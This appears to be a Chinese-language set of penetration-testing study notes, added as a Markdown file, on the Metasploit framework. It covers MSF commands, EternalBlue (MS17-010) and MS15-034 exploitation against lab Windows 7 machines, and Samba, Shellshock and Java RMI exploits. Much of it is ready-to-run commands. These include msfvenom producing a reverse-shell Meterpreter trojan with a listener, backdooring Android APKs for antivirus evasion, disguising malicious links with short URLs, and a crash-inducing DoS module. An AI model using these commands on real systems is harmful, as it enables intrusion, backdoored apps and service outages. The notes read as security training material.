@@ -1,0 +1,266 @@
+# 渗透测试-漏洞利用与MSF框架
+
+## Windows 漏洞利用
+### 概述
+通过漏洞利用工具（如 Metasploit Framework，简称 MSF）针对 Windows 系统进行渗透测试。
+### 工具
+- MSF：核心渗透测试框架。
+- 其他：根据漏洞特性选择特定工具（如 `msfvenom`、`Wine`）。
+
+## MSF 初体验
+### 基本操作
+1. **启动 MSF**：
+   ```
+   msfconsole
+   ```
+2. **查看帮助**：
+   ```
+   help
+   ```
+3. **搜索模块**：
+   ```
+   search <关键字>
+   ```
+4. **使用模块**：
+   ```
+   use <模块ID或路径>
+   ```
+5. **查看模块信息**：
+   ```
+   info
+   ```
+6. **显示配置选项**：
+   ```
+   show options
+   ```
+   - `Required` 字段表示配置是否必填。
+7. **设置参数**：
+   ```
+   set <配置名> <值>
+   ```
+8. **执行攻击**：
+   ```
+   exploit
+   ```
+9. **成功后**：
+   - 进入交互式 shell（如 Meterpreter），可执行后续命令。
+
+## MSF 简单介绍
+### 核心概念
+1. **Payload（攻击荷载）**：
+   - 定义：攻击成功后在目标主机执行的代码。
+   - 存储：MSF 主目录下的 `payloads` 文件夹。
+2. **Shellcode（溢出代码）**：
+   - 定义：攻击时执行的机器指令，通常用汇编编写。
+   - 作用：触发后提供 shell 或 Meterpreter。
+3. **Module（模块）**：
+   - 定义：MSF 中的代码组件。
+   - 类型：
+     - `exploits`：漏洞利用模块。
+     - `auxiliary`：辅助模块（如扫描）。
+     - `encoders`：编码模块。
+     - `payloads`：荷载模块。
+     - `post`：后渗透模块。
+   - 存储：`modules` 目录。
+
+## MSF 命令与使用流程
+### 常用命令
+- `help`：查看帮助。
+- `search <关键字>`：搜索模块。
+- `use <路径或ID>`：进入模块。
+- `show options`：查看配置项。
+- `info`：查看模块详情。
+- `set <配置名> <值>`：设置参数。
+- `exploit`：执行攻击。
+- `kill <进程ID>`：终止进程。
+- `jobs`：查看后台任务。
+### 导入模块
+1. **下载模块**：
+   ```
+   git clone <CVE模块URL>
+   ```
+2. **导入**：
+   - 将 `.rb` 文件放入 `modules` 对应目录（如 `exploits/windows/smb`）。
+   - 确保格式兼容 MSF。
+
+## MSF 常用命令
+- `back`：返回上一级。
+- `exit`：退出 MSF。
+- `bg`：将当前 session 放入后台。
+- `sessions`：列出后台 session。
+- `sessions -i <ID>`：进入指定 session。
+- `unset <配置名>`：取消配置。
+- `load <模块名>`：加载模块。
+- `reload_all`：重载所有模块。
+- `unload <模块名>`：卸载模块。
+
+## MSF 高级使用
+### Exploits 模块
+- **命名规则**：`系统/服务/名称`（如 `windows/smb/ms17_010_eternalblue`）。
+- **常用配置**：
+  - `RHOST`：目标 IP。
+  - `RPORT`：目标端口。
+  - `Payload`：攻击荷载。
+  - `LHOST`：攻击者 IP。
+  - `LPORT`：攻击者端口。
+### Payloads 模块
+- **命名规则**：`系统/服务/名称`。
+- **类型**：
+  - `shell`：上传 shell。
+  - `dllinject`：DLL 注入。
+  - `patchup`：修补类。
+  - `upexec`：上传并执行文件。
+  - `meterpreter`：高级 shell。
+  - `vncinject`：VNC 注入。
+  - `passive`：被动式 payload。
+### 高级技巧
+1. **远控木马**：
+   - 使用 `pcshare` 生成木马，结合漏洞上传并运行。
+2. **隐藏链接**：
+   - 生成短 URL（如 `tinyurl`）隐藏恶意链接。
+3. **沙箱检测**：
+   - 使用微步在线沙箱分析木马行为。
+### 经典漏洞
+- `ms08-067`：SMB 服务器漏洞。
+- `ms10-018`：IE 浏览器漏洞。
+- `ms10-087`：Office 格式漏洞。
+- `ms15-034`：HTTP.sys 远程代码执行。
+- `cve-2019-0708` & `ms12-020`：RDP 3389 漏洞。
+- `cve-2020-0796`：SMBv3 445 端口漏洞。
+
+## Linux 漏洞利用
+### Samba 低版本漏洞
+1. **探测**：
+   - `nmap -p445 --script smb-vuln* <IP>`：探测存活和服务版本。
+   - `auxiliary/scanner/smb/smb_version`：确认 SMB 版本。
+2. **利用**：
+   - `use <samba_exploit_module>`：建立反弹 shell。
+   - 优化 shell：
+     ```
+     python -c 'import pty; pty.spawn("/bin/bash")'
+     ```
+### 破壳（Shellshock）CGI 漏洞
+- **CVE**：CVE-2014-6271。
+- **特点**：
+  - CGI：访问时动态创建进程。
+  - FastCGI：预创建进程池。
+- **利用**：使用 MSF 的 `exploit/multi/http/apache_mod_cgi_bash_env_exec`。
+### Java RMI 利用
+1. **探测**：
+   - `nmap -p1099 <IP>`：检查 RMI 端口。
+2. **利用**：
+   - `use exploit/multi/java_rmi_server`。
+
+## MSF 木马生成与使用
+### CVE-2017-8464（震网三代）
+1. **生成木马**：
+   ```
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o trojan.exe
+   ```
+2. **监听**：
+   ```
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST <IP>
+   set LPORT <PORT>
+   exploit
+   ```
+
+### Android 木马免杀
+1. **工具**：
+   - `backdoor-apk`：注入后门。
+   - `Apktool`：反编译 APK。
+2. **环境**：
+   - 下载 `apktool.jar` 和脚本。
+   - 安装依赖：
+     ```
+     apt install lib32stdc++6 lib32ncurses6 lib32z1 smali openjdk-11-jdk-headless
+     ```
+3. **操作**：
+   - 解压 `backdoor-apk`，将 APK 放入目录。
+   - 运行注入脚本：
+     ```
+     ./backdoor-apk.sh original.apk
+     ```
+
+## 经典漏洞 MS17-010 体验
+### 环境准备
+- 创建 Win7 虚拟机（32/64 位），与攻击机同网段。
+### 操作流程
+1. **启动 MSF**：
+   ```
+   msfconsole
+   ```
+2. **扫描漏洞**：
+   ```
+   search smb_ms17_010
+   use auxiliary/scanner/smb/smb_ms17_010
+   set RHOSTS <Win7_IP>
+   exploit
+   ```
+3. **32 位支持**：
+   - 下载 32 位模块：
+     ```
+     git clone <MS17-010_32bit_repo>
+     ```
+   - 安装 Wine：
+     ```
+     dpkg --add-architecture i386 && apt update && apt install wine32
+     ```
+   - 初始化 Wine：
+     ```
+     wine cmd.exe
+     ```
+4. **利用漏洞**：
+   ```
+   msfconsole
+   use exploit/windows/smb/eternalblue_doublepulsar
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set RHOSTS <Win7_IP>
+   set LHOST <攻击机_IP>
+   set LPORT 4444
+   set PROCESSINJECT explorer.exe
+   exploit
+   ```
+### 结果
+- 成功后进入 Meterpreter shell。
+
+## 经典漏洞 MS15-034 体验
+### 概述
+MS15-034 是 HTTP.sys 中的一个严重漏洞，可能导致远程代码执行或拒绝服务。其核心问题在于 HTTP.sys 在解析特定 HTTP 请求的 `Range` 头部时存在缺陷。
+### 漏洞原理
+1. **Range 头部**：
+   - 定义：HTTP 协议允许客户端通过 `Range` 头部请求资源的一部分，例如 `Range: bytes=0-100`，用于分段下载。
+2. **问题**：
+   - 当客户端发送畸形 `Range` 头部（如超大范围值）时，HTTP.sys 未正确验证和处理，导致缓冲区溢出或内存错误。
+   - 示例：`Range: bytes=0-18446744073709551615`（64 位无符号整数最大值）。
+### 操作流程
+1. **环境准备**：
+   - 创建 Win7 虚拟机，开启 IIS 服务。
+   - 确认目标系统未安装 MS15-034 修复补丁（KB3042553）。
+2. **漏洞探测**：
+   - **方法**：构造超大 `Range` 值的 HTTP 请求：
+     ```
+     curl -H "Range: bytes=0-18446744073709551615" http://<Win7_IP>
+     ```
+   - **结果**：
+     - 未修补系统返回 `416 Range Not Satisfiable`，表示存在漏洞。
+     - 已修补系统返回其他状态码（如 `400 Bad Request`）。
+3. **启动 MSF**：
+   ```
+   msfconsole
+   ```
+4. **搜索模块**：
+   ```
+   search ms15-034
+   ```
+5. **使用模块**：
+   - 示例模块：`auxiliary/dos/http/ms15_034_ulonglongadd`（用于 DoS 攻击）：
+     ```
+     use auxiliary/dos/http/ms15_034_ulonglongadd
+     set RHOSTS <Win7_IP>
+     set RPORT 80
+     exploit
+     ```
+6. **攻击结果**：
+   - 成功触发 DoS，未修补系统可能崩溃或蓝屏。
